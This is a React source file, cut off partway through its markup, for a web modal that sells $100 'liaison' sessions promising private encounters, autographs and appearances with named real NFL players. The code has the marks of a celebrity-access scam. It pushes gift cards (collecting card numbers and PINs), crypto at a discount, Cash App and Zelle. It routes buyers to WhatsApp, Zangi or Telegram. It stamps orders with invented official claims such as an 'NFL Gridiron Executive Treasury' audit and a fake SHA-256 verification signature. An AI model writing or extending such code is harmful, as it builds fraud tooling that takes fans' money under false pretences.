import React, { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  X, 
  Sparkles, 
  ShieldCheck, 
  ArrowRight, 
  Send, 
  Check, 
  Clock, 
  User, 
  Mail, 
  Phone, 
  MessageSquare, 
  QrCode, 
  Download, 
  Copy, 
  Search, 
  CheckCircle2, 
  AlertCircle, 
  DollarSign, 
  Smartphone, 
  Radio, 
  Layers, 
  Lock 
} from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { doc, setDoc, serverTimestamp } from "firebase/firestore";
import { db, auth, safeSetDoc } from "../lib/firebase";
import { NFL_TEAMS, getLogoUrl } from "../constants";
import { cn } from "../lib/utils";
import { CustomerPaymentWaitingTerminal } from "./common/CustomerPaymentWaitingTerminal";
import { generateTicketPDF } from "../utils/ticketPdfGenerator";

interface PlayerInquiryModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialPlayer?: string;
  initialTeamId?: string;
  onOpenTicketPortal?: (query?: string) => void;
}

const MESSAGING_PLATFORMS = [
  { id: "whatsapp", name: "WhatsApp", icon: "💬", badge: "Direct Chat & Voice", color: "text-emerald-400 border-emerald-500/30 bg-emerald-500/10" },
  { id: "zangi", name: "Zangi", icon: "🛡️", badge: "Private Zangi Safe Chat", color: "text-amber-400 border-amber-500/30 bg-amber-500/10" },
  { id: "telegram", name: "Telegram", icon: "✈️", badge: "Fast Encrypted Ping", color: "text-blue-400 border-blue-500/30 bg-blue-500/10" }
];

const INQUIRY_OBJECTIVES = [
  "1-on-1 Private Encounter & Photo Op",
  "Autograph & Certified Memorabilia",
  "Live Podcast or Studio Guest Appearance",
  "VIP Game Day Sideline & Tunnel Pass",
  "Custom Video Shoutout / Cameo",
  "Private Masterclass & Football Coaching",
  "Corporate / Sponsor Brand Appearance"
];

const POPULAR_PLAYERS_BY_TEAM: Record<string, string[]> = {
  KC: ["Patrick Mahomes", "Travis Kelce", "Chris Jones", "Isiah Pacheco"],
  SF: ["Brock Purdy", "Christian McCaffrey", "George Kittle", "Nick Bosa"],
  BAL: ["Lamar Jackson", "Derrick Henry", "Roquan Smith", "Zay Flowers"],
  PHI: ["Jalen Hurts", "Saquon Barkley", "A.J. Brown", "DeVonta Smith"],
  DET: ["Jared Goff", "Amon-Ra St. Brown", "Aidan Hutchinson", "Jahmyr Gibbs"],
  BUF: ["Josh Allen", "James Cook", "Dalton Kincaid", "Von Miller"],
  DAL: ["Dak Prescott", "CeeDee Lamb", "Micah Parsons", "Trevon Diggs"],
  HOU: ["C.J. Stroud", "Jalen Pitre", "Stefon Diggs", "Will Anderson Jr."],
  DEN: ["Bo Nix", "Courtland Sutton", "Patrick Surtain II", "Javonte Williams"],
  MIN: ["Justin Jefferson", "Sam Darnold", "Jordan Addison", "Harrison Smith"],
  GB: ["Jordan Love", "Josh Jacobs", "Jayden Reed", "Jaire Alexander"],
  MIA: ["Tua Tagovailoa", "Tyreek Hill", "Jaylen Waddle", "Jalen Ramsey"],
  CIN: ["Joe Burrow", "Ja'Marr Chase", "Tee Higgins", "Trey Hendrickson"],
  NE: ["Drake Maye", "Rhamondre Stevenson", "Demario Douglas", "Christian Gonzalez"]
};

export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
  isOpen,
  onClose,
  initialPlayer = "",
  initialTeamId = "KC",
  onOpenTicketPortal
}) => {
  const [step, setStep] = useState<"details" | "payment" | "success">("details");

  // Form State
  const [fullName, setFullName] = useState(() => localStorage.getItem("nfl_guest_sender_name") || "");
  const [email, setEmail] = useState(() => localStorage.getItem("nfl_guest_buyer_email") || "");
  const [phone, setPhone] = useState(() => localStorage.getItem("nfl_guest_buyer_phone") || "");
  const [selectedTeamId, setSelectedTeamId] = useState<string>(initialTeamId || "KC");
  const [teamSearch, setTeamSearch] = useState("");
  const [favoritePlayer, setFavoritePlayer] = useState(initialPlayer || "");
  const [messagingPlatform, setMessagingPlatform] = useState<string>("whatsapp");
  const [messagingDetails, setMessagingDetails] = useState("");
  const [inquiryObjective, setInquiryObjective] = useState<string>(INQUIRY_OBJECTIVES[0]);
  const [specialNotes, setSpecialNotes] = useState("");

  // Payment State
  const [paymentMethod, setPaymentMethod] = useState<"cashapp" | "crypto" | "paypal" | "venmo" | "zelle" | "giftcard">("cashapp");
  const [paymentRef, setPaymentRef] = useState("");
  const [receiptImageUrl, setReceiptImageUrl] = useState("");
  const [receiptImageUrls, setReceiptImageUrls] = useState<string[]>([]);
  const [giftCardDetails, setGiftCardDetails] = useState({ brand: "Apple", cardNumber: "", pin: "", amount: "100" });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);

  // Completed Inquiry Session Data
  const [completedOrder, setCompletedOrder] = useState<any | null>(null);
  const [checkoutSessionId] = useState(() => `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  if (!isOpen) return null;

  const selectedTeam = NFL_TEAMS.find(t => t.id === selectedTeamId) || NFL_TEAMS[0];
  const suggestedPlayers = POPULAR_PLAYERS_BY_TEAM[selectedTeamId] || ["Patrick Mahomes", "Lamar Jackson", "Brock Purdy", "Josh Allen", "Justin Jefferson"];
  
  // Calculate price: $100 flat session fee (5% discount if Crypto = $95)
  const isCrypto = paymentMethod === "crypto";
  const finalPrice = isCrypto ? 95 : 100;

  const handleCopy = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const handleProceedToPayment = (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    if (!fullName.trim()) {
      setFormError("Please enter your Full Name.");
      return;
    }
    if (!email.trim() || !email.includes("@")) {
      setFormError("Please enter a valid Email Address for pass delivery and status updates.");
      return;
    }
    if (!favoritePlayer.trim()) {
      setFormError("Please specify the favorite NFL player you wish to inquire about.");
      return;
    }
    if (!messagingDetails.trim()) {
      setFormError(`Please provide your ${MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} phone number or username handle.`);
      return;
    }

    // Save to localStorage for convenience
    localStorage.setItem("nfl_guest_sender_name", fullName.trim());
    localStorage.setItem("nfl_guest_buyer_email", email.trim());
    if (phone.trim()) localStorage.setItem("nfl_guest_buyer_phone", phone.trim());

    setStep("payment");
  };

  const handleFinalizeInquiry = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setFormError(null);
    setIsSubmitting(true);

    try {
      const orderId = `ORD-INQ-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`;
      const passCode = `PASS-INQ-${Date.now().toString(36).toUpperCase()}`;
      const rfidCode = `RFID-INQ-${orderId}`;
      const nowIso = new Date().toISOString();

      const platformObj = MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform);
      const platformName = platformObj?.name || messagingPlatform.toUpperCase();

      const orderData: any = {
        id: orderId,
        orderId: orderId,
        bookingId: orderId,
        shortId: `INQ-${selectedTeam.id}-${favoritePlayer.replace(/\s+/g, "").slice(0, 6).toUpperCase()}`,
        ticketCode: passCode,
        qrCode: passCode,
        passCode: passCode,
        rfidCode: rfidCode,
        securitySignature: "SHA-256 PLAYER INQUIRY $100 VERIFIED LIAISON",
        experienceId: "exp-player-inquiry-session",
        gameId: "exp-player-inquiry-session",
        experienceTitle: `NFL STAR PLAYER INQUIRY: ${favoritePlayer.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
        gameName: `NFL Player Inquiry Session: ${favoritePlayer}`,
        eventTitle: `NFL Player Inquiry Session: ${favoritePlayer}`,
        itemName: `NFL Player Inquiry Session (${favoritePlayer}) - $100 Liaison Deposit`,
        experienceType: "player_inquiry",
        player: favoritePlayer.trim(),
        favoritePlayer: favoritePlayer.trim(),
        teamId: selectedTeam.id,
        teamName: `${selectedTeam.city} ${selectedTeam.name}`,
        homeTeam: `${selectedTeam.city} ${selectedTeam.name}`,
        awayTeam: "Custom Talent Liaison",
        stadium: "Executive Talent Concierge (Private Roster Clearing)",
        venue: "NFL Player Liaison Concierge",
        location: "Private Direct Channels & Agency Liaison",
        city: selectedTeam.city,
        state: "US",
        date: "Coordinated upon clearance of $100 inquiry fee",
        eventDate: "Awaiting Player Details",
        displayDate: "Coordinated directly with player agency",
        formattedDate: "Awaiting Player Details",
        time: "24/7 Rapid Liaison Dispatch",
        timeSlot: "24/7 Rapid Liaison Dispatch",
        admissionTime: "Player Scheduled Window",
        tier: "standard",
        tierName: "PLAYER INQUIRY CLEARANCE PASS",
        seatDetails: `Target Player: ${favoritePlayer.trim()} · Preferred Contact: ${platformName} (${messagingDetails.trim()})`,
        quantity: 1,
        guestsCount: 1,
        unitPrice: 100,
        price: 100,
        totalPrice: finalPrice,
        totalAmount: finalPrice,
        dueToday: finalPrice,
        currency: "USD",
        messagingPlatform: platformName,
        messagingDetails: messagingDetails.trim(),
        inquiryObjective: inquiryObjective,
        specialNotes: specialNotes.trim(),
        inquiryStatus: "awaiting_player_details",
        playerDetailsStatus: "awaiting",
        buyerName: fullName.trim(),
        userName: fullName.trim(),
        senderName: fullName.trim(),
        passholderName: fullName.trim(),
        buyerEmail: email.trim(),
        userEmail: email.trim(),
        email: email.trim(),
        userId: auth.currentUser?.uid || `guest_${Date.now()}`,
        buyerPhone: phone.trim() || messagingDetails.trim(),
        status: "pending", // awaiting admin review & player details dispatch
        orderStatus: "AWAITING PLAYER DETAILS",
        approvalStatus: "PAYMENT LOGGED ($100) · AWAITING PLAYER DETAILS",
        isApproved: false,
        verificationNotice: `AUDITED BY NFL GRIDIRON EXECUTIVE TREASURY · $100 LIAISON DEPOSIT LOGGED FOR ${favoritePlayer.toUpperCase()}`,
        paymentMethod: paymentMethod,
        paymentReference: paymentRef || `INQ-${checkoutSessionId}`,
        paymentRef: paymentRef || `INQ-${checkoutSessionId}`,
        paymentChannel: paymentMethod.toUpperCase(),
        receiptImage: receiptImageUrls[0] || receiptImageUrl || "",
        receiptImageUrl: receiptImageUrls[0] || receiptImageUrl || "",
        receiptImages: receiptImageUrls.length > 0 ? receiptImageUrls : (receiptImageUrl ? [receiptImageUrl] : []),
        giftCardDetails: paymentMethod === "giftcard" ? giftCardDetails : undefined,
        createdAt: nowIso,
        updatedAt: nowIso,
        imageUrl: "https://images.unsplash.com/photo-1566577739112-5180d4bf9390?auto=format&fit=crop&q=80&w=1200",
        ticketImageUrl: "https://images.unsplash.com/photo-1566577739112-5180d4bf9390?auto=format&fit=crop&q=80&w=1200",
        features: [
          `Target Player Inquired: ${favoritePlayer.trim()}`,
          `Franchise: ${selectedTeam.city} ${selectedTeam.name}`,
          `Official $100 talent liaison deposit logged`,
          `Contact channel: ${platformName} (${messagingDetails.trim()})`,
          `Awaiting direct player schedule & booking availability packet`,
          `Concierge liaison outreach active`
        ]
      };

      // 1. Write to bookings collection
      await safeSetDoc(doc(db, "bookings", orderId), orderData);

      // 2. Write to ticket_orders collection for synchronization
      await safeSetDoc(doc(db, "ticket_orders", orderId), {
        ...orderData,
        timestamp: serverTimestamp()
      });

      // 3. Write to store_orders collection
      await safeSetDoc(doc(db, "store_orders", `order-${orderId}`), {
        userId: auth.currentUser?.uid || "guest",
        userEmail: email.trim(),
        buyerName: fullName.trim(),
        buyerPhone: phone.trim() || messagingDetails.trim(),
        itemType: "ticket",
        itemName: `NFL Player Inquiry Session (${favoritePlayer.trim()}) [${platformName}]`,
        price: finalPrice,
        teamId: selectedTeam.id,
        paymentMethod: paymentMethod,
        paymentRef: paymentRef || "PENDING_CONCIERGE_VERIFICATION",
        receiptImage: receiptImageUrls[0] || receiptImageUrl || "",
        status: "pending_approval",
        orderStatus: "AWAITING PLAYER DETAILS",
        isApproved: false,
        favoritePlayer: favoritePlayer.trim(),
        messagingPlatform: platformName,
        messagingDetails: messagingDetails.trim(),
        timestamp: nowIso
      });

      // 4. Also store in customer_inquiries collection for real-time concierge dispatch
      await safeSetDoc(doc(db, "customer_inquiries", orderId), {
        id: orderId,
        type: "player_inquiry",
        category: "player_inquiry",
        customerName: fullName.trim(),
        customerEmail: email.trim(),
        customerPhone: phone.trim(),
        teamId: selectedTeam.id,
        teamName: `${selectedTeam.city} ${selectedTeam.name}`,
        favoritePlayer: favoritePlayer.trim(),
        messagingPlatform: platformName,
        messagingDetails: messagingDetails.trim(),
        inquiryObjective: inquiryObjective,
        specialNotes: specialNotes.trim(),
        feePaid: finalPrice,
        paymentMethod: paymentMethod,
        paymentRef: paymentRef || "SUBMITTED",
        receiptImage: receiptImageUrls[0] || receiptImageUrl || "",
        status: "awaiting_player_details",
        createdAt: nowIso
      });

      setCompletedOrder(orderData);
      setStep("success");
    } catch (err: any) {
      console.error("Error creating player inquiry:", err);
      setFormError(`Failed to save inquiry: ${err.message || String(err)}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDownloadPdf = async () => {
    if (!completedOrder) return;
    try {
      await generateTicketPDF({
        id: completedOrder.id,
        orderId: completedOrder.orderId,
        ticketCode: completedOrder.ticketCode,
        qrCode: completedOrder.qrCode,
        eventTitle: completedOrder.experienceTitle,
        experienceTitle: completedOrder.experienceTitle,
        gameName: completedOrder.gameName,
        stadium: completedOrder.stadium,
        city: completedOrder.city,
        date: completedOrder.date,
        time: completedOrder.time,
        timeSlot: completedOrder.timeSlot,
        tier: "PLAYER INQUIRY CLEARANCE PASS",
        seatDetails: `Target Player: ${completedOrder.player} · Contact: ${completedOrder.messagingPlatform} (${completedOrder.messagingDetails})`,
        buyerName: completedOrder.buyerName,
        userEmail: completedOrder.buyerEmail,
        buyerPhone: completedOrder.buyerPhone,
        totalAmount: completedOrder.totalPrice,
        paymentMethod: completedOrder.paymentMethod,
        paymentRef: completedOrder.paymentRef,
        status: "AWAITING PLAYER DETAILS"
      });
    } catch (err) {
      console.error("PDF Download Error:", err);
      alert("Could not generate PDF directly. Please take a screenshot or use Ticket Portal.");
    }
  };

  return (
    <div className="fixed inset-0 z-[150] flex items-center justify-center p-3 sm:p-4 bg-black/90 backdrop-blur-md overflow-y-auto">
      <motion.div
        initial={{ scale: 0.95, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.95, opacity: 0 }}
        className="relative w-full max-w-2xl bg-zinc-950 border border-blue-500/20 rounded-[2.5rem] shadow-2xl overflow-hidden my-auto"
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 w-10 h-10 rounded-full bg-zinc-900 border border-white/10 flex items-center justify-center text-zinc-400 hover:text-white transition-all z-30 cursor-pointer"
        >
          <X className="w-4 h-4" />
        </button>

        {/* Modal Banner Header */}
        <div className="relative p-6 sm:p-8 bg-gradient-to-r from-blue-900/60 via-indigo-950/60 to-zinc-950 border-b border-white/10">
          <div className="flex items-center gap-2 mb-2">
            <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-[9px] font-black uppercase tracking-widest text-blue-400 animate-pulse">
              <Sparkles className="w-3.5 h-3.5" />
              NFL Roster Concierge
            </span>
            <span className="px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[9px] font-mono font-black text-emerald-400">
              $100 FLAT SESSION FEE
            </span>
          </div>

          <h3 className="text-xl sm:text-2xl font-black italic uppercase tracking-tighter text-white">
            CUSTOM NFL PLAYER INQUIRY & LIAISON
          </h3>
          <p className="text-xs text-zinc-400 mt-1 max-w-lg font-medium leading-relaxed">
            Inquire about any active NFL superstar or roster talent across all 32 franchises. Submit your target player and preferred messaging contact to receive verified player availability and scheduling details.
          </p>

          {/* Stepper indicator */}
          <div className="flex items-center gap-2 mt-4 pt-4 border-t border-white/5 text-[9px] font-black uppercase tracking-widest">
            <div className={cn("flex items-center gap-1.5", step === "details" ? "text-blue-400" : "text-zinc-500")}>
              <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "details" ? "bg-blue-600 text-white" : "bg-zinc-800 text-zinc-400")}>1</span>
              <span>Player & Contact Info</span>
            </div>
            <ArrowRight className="w-3 h-3 text-zinc-700" />
            <div className={cn("flex items-center gap-1.5", step === "payment" ? "text-blue-400" : "text-zinc-500")}>
              <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "payment" ? "bg-blue-600 text-white" : "bg-zinc-800 text-zinc-400")}>2</span>
              <span>Deposit & Payment</span>
            </div>
            <ArrowRight className="w-3 h-3 text-zinc-700" />
            <div className={cn("flex items-center gap-1.5", step === "success" ? "text-emerald-400" : "text-zinc-500")}>
              <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "success" ? "bg-emerald-500 text-black" : "bg-zinc-800 text-zinc-400")}>3</span>
              <span>Await Player Details</span>
            </div>
          </div>
        </div>

        {/* Modal Scrollable Body */}
        <div className="p-6 sm:p-8 max-h-[68vh] overflow-y-auto no-scrollbar space-y-6">
          {formError && (
            <div className="p-3.5 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex items-center gap-2 text-rose-400 text-xs font-bold">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{formError}</span>
            </div>
          )}

          {/* STEP 1: PLAYER & CUSTOMER DETAILS FORM */}
          {step === "details" && (
            <form onSubmit={handleProceedToPayment} className="space-y-6">
              {/* Section 1: Target Team & Player */}
              <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-blue-500" />
                    1. Target NFL Franchise & Favorite Player
                  </h4>
                  <span className="text-[9px] font-mono text-zinc-500 uppercase">ALL 32 TEAMS ELIGIBLE</span>
                </div>

                {/* Team Selection */}
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase text-zinc-400 block tracking-wider">
                    Select NFL Franchise
                  </label>
                  <div className="flex items-center gap-3 p-3 bg-zinc-900 rounded-2xl border border-white/10">
                    <img 
                      src={getLogoUrl(selectedTeam.id)} 
                      alt={selectedTeam.name} 
                      className="w-10 h-10 object-contain shrink-0" 
                    />
                    <div className="flex-1 min-w-0">
                      <select
                        value={selectedTeamId}
                        onChange={(e) => setSelectedTeamId(e.target.value)}
                        className="w-full bg-transparent text-sm font-black text-white uppercase focus:outline-none cursor-pointer"
                      >
                        {NFL_TEAMS.map(team => (
                          <option key={team.id} value={team.id} className="bg-zinc-900 text-white font-sans text-xs">
                            {team.city} {team.name} ({team.id})
                          </option>
                        ))}
                      </select>
                      <p className="text-[9px] text-zinc-500 font-mono mt-0.5">
                        Selected: {selectedTeam.city} {selectedTeam.name}
                      </p>
                    </div>
                  </div>
                </div>

                {/* Favorite Player Input */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider">
                      Favorite Player to Inquire About <span className="text-rose-400">*</span>
                    </label>
                    <span className="text-[9px] text-zinc-500 font-mono">Active or Legend</span>
                  </div>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Patrick Mahomes, Lamar Jackson, Brock Purdy..."
                    value={favoritePlayer}
                    onChange={(e) => setFavoritePlayer(e.target.value)}
                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-sm text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                  />

                  {/* Player suggestions for selected team */}
                  <div className="flex flex-wrap items-center gap-1.5 pt-1">
                    <span className="text-[9px] font-mono text-zinc-500 uppercase">Suggestions:</span>
                    {suggestedPlayers.map(pName => (
                      <button
                        key={pName}
                        type="button"
                        onClick={() => setFavoritePlayer(pName)}
                        className={cn(
                          "px-2.5 py-1 rounded-lg text-[9px] font-bold transition-all cursor-pointer",
                          favoritePlayer === pName
                            ? "bg-blue-600 text-white"
                            : "bg-zinc-800 hover:bg-zinc-700 text-zinc-300"
                        )}
                      >
                        {pName}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Inquiry Objective */}
                <div className="space-y-2 pt-2">
                  <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
                    Inquiry Objective / Intended Experience
                  </label>
                  <select
                    value={inquiryObjective}
                    onChange={(e) => setInquiryObjective(e.target.value)}
                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-xs text-white font-bold focus:outline-none focus:border-blue-500"
                  >
                    {INQUIRY_OBJECTIVES.map(obj => (
                      <option key={obj} value={obj} className="bg-zinc-900 text-white text-xs">
                        {obj}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {/* Section 2: Customer Identity & Preferred Messaging Platform */}
              <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-500" />
                    2. Your Contact & Messaging Platform
                  </h4>
                  <span className="text-[9px] font-mono text-emerald-400">WHERE WE SEND PLAYER DETAILS</span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {/* Full Name */}
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
                      <User className="w-3.5 h-3.5 text-zinc-500" />
                      Full Name <span className="text-rose-400">*</span>
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="e.g. John Doe"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                    />
                  </div>

                  {/* Email */}
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
                      <Mail className="w-3.5 h-3.5 text-zinc-500" />
                      Email Address <span className="text-rose-400">*</span>
                    </label>
                    <input
                      type="email"
                      required
                      placeholder="e.g. john@example.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                    />
                  </div>
                </div>

                {/* Messaging Platform Choice */}
                <div className="space-y-2 pt-2">
                  <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
                    Choose Your Messaging Platform for Direct Liaison <span className="text-rose-400">*</span>
                  </label>
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                    {MESSAGING_PLATFORMS.map(p => {
                      const isSelected = messagingPlatform === p.id;
                      return (
                        <button
                          key={p.id}
                          type="button"
                          onClick={() => setMessagingPlatform(p.id)}
                          className={cn(
                            "p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between",
                            isSelected
                              ? `${p.color} ring-1 ring-white/20 shadow-lg`
                              : "bg-zinc-900/60 border-white/5 hover:border-white/15 text-zinc-400"
                          )}
                        >
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-base">{p.icon}</span>
                            {isSelected && <Check className="w-3.5 h-3.5 text-white" />}
                          </div>
                          <span className="text-xs font-black uppercase tracking-wide text-white block">
                            {p.name}
                          </span>
                          <span className="text-[8px] font-mono opacity-80 mt-0.5 truncate block">
                            {p.badge}
                          </span>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* Messaging Platform Details / Handle */}
                <div className="space-y-1.5 pt-2">
                  <label className="text-[10px] font-black uppercase text-zinc-300 flex items-center justify-between">
                    <span className="flex items-center gap-1.5">
                      <MessageSquare className="w-3.5 h-3.5 text-blue-400" />
                      {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} Details / Username / Phone Number <span className="text-rose-400">*</span>
                    </span>
                    <span className="text-[9px] font-mono text-zinc-500">Concierge Delivery</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder={
                      messagingPlatform === "whatsapp"
                        ? "e.g. +1 (203) 815-5944 (include country code)"
                        : messagingPlatform === "zangi"
                        ? "e.g. Zangi Number or Account Number (e.g. 10-1234-5678)"
                        : "e.g. @your_telegram_username or +1 phone"
                    }
                    value={messagingDetails}
                    onChange={(e) => setMessagingDetails(e.target.value)}
                    className="w-full bg-zinc-900 border border-blue-500/30 rounded-2xl px-4 py-3 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                  <p className="text-[9px] text-zinc-500">
                    Our player liaison team sends verified availability, quotes, and confirmed player details directly to this account.
                  </p>
                </div>

                {/* Special Notes / Message */}
                <div className="space-y-1.5">
                  <label className="text-[10px] font-black uppercase text-zinc-400 block">
                    Special Requests or Questions for Player (Optional)
                  </label>
                  <textarea
                    rows={2}
                    placeholder="e.g. Inquiring for an upcoming birthday in November, need 1-on-1 photo op and jersey signature..."
                    value={specialNotes}
                    onChange={(e) => setSpecialNotes(e.target.value)}
                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl p-3 text-xs text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>

              {/* Bottom Proceed CTA - $100 fee is displayed in Step 2 after selection */}
              <div className="p-5 bg-gradient-to-r from-zinc-950 via-zinc-900 to-zinc-950 rounded-3xl border border-white/10 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="text-[9px] font-black uppercase text-zinc-400 tracking-wider">
                      Official Talent Liaison Inquiry
                    </span>
                    <span className="text-[8px] font-black uppercase bg-blue-500/20 text-blue-400 border border-blue-500/30 px-2 py-0.5 rounded-full font-mono">
                      DIRECT AGENT OUTREACH
                    </span>
                  </div>
                  <p className="text-xs text-zinc-300 font-medium">
                    Review agency liaison terms & process deposit payment after confirming your player selection.
                  </p>
                </div>

                <button
                  type="submit"
                  className="px-8 py-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-xl shadow-blue-600/30 flex items-center justify-center gap-2.5 transform active:scale-95 cursor-pointer shrink-0"
                >
                  <span>Confirm Selection & Proceed</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          )}

          {/* STEP 2: PAYMENT EXECUTION ($100) */}
          {step === "payment" && (
            <div className="space-y-6">
              {/* Order recap card */}
              <div className="p-4 bg-zinc-900/60 rounded-2xl border border-white/10 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <img 
                    src={getLogoUrl(selectedTeam.id)} 
                    alt={selectedTeam.name} 
                    className="w-10 h-10 object-contain shrink-0" 
                  />
                  <div>
                    <span className="text-[8px] font-black uppercase text-blue-400 tracking-widest block">
                      PLAYER INQUIRY CLEARANCE
                    </span>
                    <h5 className="text-sm font-black uppercase text-white">
                      {favoritePlayer} · {selectedTeam.city} {selectedTeam.name}
                    </h5>
                    <p className="text-[9px] font-mono text-zinc-400">
                      Liaison Channel: {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} ({messagingDetails})
                    </p>
                  </div>
                </div>

                <div className="text-right">
                  <span className="text-[9px] font-mono text-zinc-500 uppercase block">Fee Due</span>
                  <span className="text-xl font-mono font-black text-emerald-400">${finalPrice} USD</span>
                </div>
              </div>

              {/* Payment Methods Tabs */}
              <div className="space-y-3">
                <label className="text-[10px] font-black uppercase tracking-wider text-zinc-400 flex items-center justify-between">
                  <span>Select Payment Channel</span>
                  <span className="text-[9px] font-mono text-emerald-400">5% OFF WITH CRYPTO ($95)</span>
                </label>

                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                  {[
                    { id: "cashapp", name: "Cash App", badge: "FAST", icon: Smartphone },
                    { id: "crypto", name: "Crypto (BTC/USDT)", badge: "5% OFF ($95)", icon: ShieldCheck },
                    { id: "zelle", name: "Zelle", badge: "DIRECT", icon: CheckCircle2 },
                    { id: "paypal", name: "PayPal", badge: "SECURE", icon: DollarSign },
                    { id: "venmo", name: "Venmo", badge: "INSTANT", icon: Radio },
                    { id: "giftcard", name: "Prepaid Gift Card", badge: "APPLE/GOOGLE", icon: Layers }
                  ].map(m => {
                    const isSelected = paymentMethod === m.id;
                    return (
                      <button
                        key={m.id}
                        type="button"
                        onClick={() => setPaymentMethod(m.id as any)}
                        className={cn(
                          "p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between",
                          isSelected
                            ? "bg-zinc-900 border-blue-500 ring-1 ring-blue-500/30 text-white shadow-lg"
                            : "bg-zinc-900/40 border-white/5 hover:border-white/15 text-zinc-400"
                        )}
                      >
                        <div className="flex items-center justify-between mb-1">
                          <m.icon className="w-4 h-4 text-zinc-400" />
                          <span className={cn(
                            "text-[8px] font-mono font-bold px-1.5 py-0.2 rounded",
                            m.id === "crypto" ? "bg-emerald-500/20 text-emerald-400" : "bg-white/5 text-zinc-400"
                          )}>
                            {m.badge}
                          </span>
                        </div>
                        <span className="text-xs font-black uppercase text-white tracking-wide">
                          {m.name}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Integrated Waiting Terminal / Payment Form */}
              {paymentMethod !== "giftcard" ? (
                <CustomerPaymentWaitingTerminal
                  sessionId={checkoutSessionId}
                  selectedMethod={paymentMethod as any}
                  amount={finalPrice}
                  orderReference={checkoutSessionId}
                  customerName={fullName}
                  customerEmail={email}
                  customerPhone={phone || messagingDetails}
                  itemTitle={`Player Inquiry: ${favoritePlayer} (${selectedTeam.id})`}
                  itemType="experience"
                  onSwitchToGiftCard={() => setPaymentMethod("giftcard")}
                  onPaymentSubmitted={(ref, receipt) => {
                    setPaymentRef(ref);
                    if (receipt) {
                      setReceiptImageUrl(receipt);
